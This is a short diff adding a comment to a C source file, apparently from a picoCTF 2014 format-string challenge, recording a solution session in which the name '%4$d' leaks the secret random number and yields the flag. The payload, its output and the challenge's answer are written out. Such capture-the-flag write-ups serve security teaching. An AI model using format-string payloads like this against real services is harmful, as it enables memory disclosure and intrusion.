@@ -1,3 +1,19 @@
+/*
+** Solution
+* remi@remijullian:~/ctf/format_string/guess$ nc vuln2014.picoctf.com 4546
+* Hello! What is your name?
+* %4$d
+** Welcome to the guessing game, -37693522
+** 
+** I generated a random 32-bit number.
+** You have a 1 in 2^32 chance of guessing it. Good luck.
+** What is your guess?
+** -37693522
+** Wow! You guessed it!
+** Your flag is: leak_the_seakret
+**
+*/
+
 #include <stdio.h>
 #include <stdlib.h>
 
